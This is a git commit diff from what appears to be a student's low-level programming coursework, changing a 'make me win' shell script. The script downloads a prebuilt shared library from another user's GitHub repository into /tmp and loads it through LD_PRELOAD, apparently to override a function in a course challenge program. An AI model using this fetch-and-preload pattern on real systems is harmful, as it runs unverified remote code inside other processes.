3420f906abeb16123e332463840968c90d35e658
Eric Onasis <ericonasis@gmail.com>
2023-08-21 20:30:29 +0300

    Fix Library path

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/EricOnasis/alx-low_level_programming/tree/master/0x18-dynamic_libraries/hacker.so
-export LD_PRELOAD=/tmp/hacker.so
+wget -P /tmp https://github.com/Tolulope05/alx-low_level_programming/raw/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
